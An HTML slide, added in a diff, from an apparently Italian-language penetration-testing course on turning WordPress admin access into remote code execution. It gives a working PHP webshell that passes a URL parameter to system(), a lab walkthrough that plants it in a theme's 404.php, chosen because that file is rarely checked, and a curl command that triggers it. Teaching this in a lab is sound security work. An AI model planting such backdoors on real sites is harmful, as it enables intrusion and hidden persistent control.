@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Capitolo 4: Exploitation - WordPress Admin to RCE</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="nav-buttons">
+        <div class="nav-btn" id="nav-menu"><svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></div>
+        <div class="nav-btn" id="nav-prev"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg></div>
+        <div class="nav-btn" id="nav-next"><svg viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
+    </div>
+
+    <div class="container">
+        <h1 class="title">Capitolo 4: Exploitation</h1>
+        <div class="subtitle">Slide 4.6: Da WordPress Admin a RCE</div>
+
+        <div class="grid-2-col">
+            <div class="card border-blue">
+                <div class="card-title">Teoria: Admin Access = Game Over</div>
+                <div class="card-text">
+                    <p>Se abbiamo credenziali admin WordPress, ottenere RCE è banale. Ci sono diversi metodi:</p>
+                    <br>
+                    <p><strong>Metodo 1: Theme Editor</strong></p>
+                    <ul style="margin-left: 20px;">
+                        <li>Appearance → Theme Editor</li>
+                        <li>Modifica 404.php o functions.php</li>
+                        <li>Inserisci codice PHP malevolo</li>
+                    </ul>
+                    <br>
+                    <p><strong>Metodo 2: Plugin Editor</strong></p>
+                    <ul style="margin-left: 20px;">
+                        <li>Plugins → Plugin Editor</li>
+                        <li>Modifica file PHP di un plugin attivo</li>
+                    </ul>
+                    <br>
+                    <p><strong>Metodo 3: Upload Plugin Malevolo</strong></p>
+                    <ul style="margin-left: 20px;">
+                        <li>Plugins → Add New → Upload</li>
+                        <li>Carica ZIP con webshell</li>
+                    </ul>
+                    <br>
+                    <p class="security-insight"><strong>Security Insight:</strong> Alcuni hosting disabilitano gli editor. In quel caso, usa l'upload di plugin o Metasploit <code>wp_admin_shell_upload</code>.</p>
+                </div>
+            </div>
+
+            <div class="card border-green">
+                <div class="card-title">Lab: Backdoor via Theme Editor</div>
+                <div class="card-text">
+                    <p><strong>Step 1: Login come admin</strong></p>
+                    <div class="code-box">URL: http://vulnerable-wp.local/wp-admin/
+User: admin
+Pass: admin123</div>
+                    <br>
+                    <p><strong>Step 2: Vai su Appearance → Theme Editor</strong></p>
+                    <p><strong>Step 3: Seleziona 404.php del tema attivo</strong></p>
+                    <br>
+                    <p><strong>Step 4: Aggiungi codice in cima al file:</strong></p>
+                    <div class="code-box"><span class="text-red">&lt;?php</span>
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+<span class="text-red">?&gt;</span></div>
+                    <br>
+                    <p><strong>Step 5: Triggera la backdoor</strong></p>
+                    <div class="code-box"><span class="text-red">└─$</span> curl "http://vulnerable-wp.local/wp-content/themes/twentynineteen/404.php?cmd=id"
+
+<span class="text-green">uid=33(www-data) gid=33(www-data)</span></div>
+                </div>
+            </div>
+        </div>
+        
+    </div>
+
+    <!-- 
+        SPEAKER NOTES:
+        "Metodo alternativo: se abbiamo le credenziali admin dal brute force, la RCE è garantita.
+        A sinistra, i tre metodi. Theme Editor è il più comune, Plugin Editor è simile, Upload Plugin è il più pulito.
+        A destra, il processo pratico. Logghiamoci, andiamo nell'editor, modifichiamo 404.php.
+        Perché 404.php? Perché è un file che esiste in ogni tema e raramente viene controllato.
+        Aggiungiamo il nostro codice in cima, salviamo, e abbiamo una backdoor.
+        Per trigggerarla, visitiamo direttamente il file (non una pagina 404, il FILE stesso).
+        NOTA: WordPress recente mostra un warning prima di salvare. Cliccate 'I understand'."
+    -->
+
+    <script>const slideNumero = 29;</script>
+    <script src="main.js"></script>
+</body>
+</html>
+
